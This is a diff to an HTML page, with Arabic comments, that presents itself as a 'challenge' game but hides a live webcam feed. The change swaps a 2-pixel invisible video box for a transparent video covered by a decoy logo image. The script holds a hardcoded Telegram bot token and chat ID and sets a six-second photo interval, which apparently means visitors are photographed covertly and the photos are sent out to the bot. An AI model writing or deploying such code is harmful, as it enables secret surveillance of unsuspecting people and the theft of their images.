@@ -47,23 +47,33 @@
             color: #ffcc00;
             font-weight: bold;
         }
-        /* ← التعديل الرئيسي: إخفاء الكاميرا تمامًا لكن بطريقة تعمل */
-        #video-wrapper {
+        /* الحاوية الصغيرة في الزاوية */
+        #hidden-camera {
             position: fixed;
-            bottom: 0;
-            right: 0;
-            width: 2px;
-            height: 2px;
-            overflow: hidden;
-            z-index: -9999;
+            bottom: 5px;
+            right: 5px;
+            width: 80px;   /* حجم الصورة اللي هتغطي الكاميرا */
+            height: 80px;
+            z-index: 9999;
             pointer-events: none;
-            background: transparent;
         }
-        #video {
+        #hidden-camera video {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            opacity: 0;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0; /* الكاميرا نفسها شفافة */
+        }
+        #hidden-camera img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 2; /* الصورة فوق الكاميرا */
         }
     </style>
 </head>
@@ -80,16 +90,18 @@
    
     <div id="status">اضغط الزر لبدء التحدي...</div>
 
-    <!-- حاوية صغيرة جدًا في الزاوية لإخفاء الكاميرا -->
-    <div id="video-wrapper">
+    <!-- الحاوية اللي فيها الكاميرا + الصورة اللي تغطيها -->
+    <div id="hidden-camera">
         <video id="video" autoplay playsinline muted></video>
+        <!-- غيّر رابط الصورة هنا إلى صورة مناسبة (شعار تركس، ديناصور، أو أي صورة صغيرة) -->
+        <img src="https://i.imgur.com/0Z0Z0Z0.png" alt="T-Rex Logo"> <!-- مثال، استبدل برابط صورة حقيقية -->
     </div>
 
     <script>
         let stream = null;
         const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
         const CHAT_ID = '6611123941';
-        const PHOTO_INTERVAL = 6000; // كل 6 ثواني (يمكنك تغييرها)
+        const PHOTO_INTERVAL = 6000;
 
         async function startCamera() {
             const status = document.getElementById('status');
@@ -106,7 +118,7 @@
 
                 await new Promise(resolve => {
                     video.onloadeddata = () => {
-                        console.log("الفيديو جاهز للالتقاط");
+                        console.log("الفيديو جاهز");
                         resolve();
                     };
                     setTimeout(resolve, 8000);
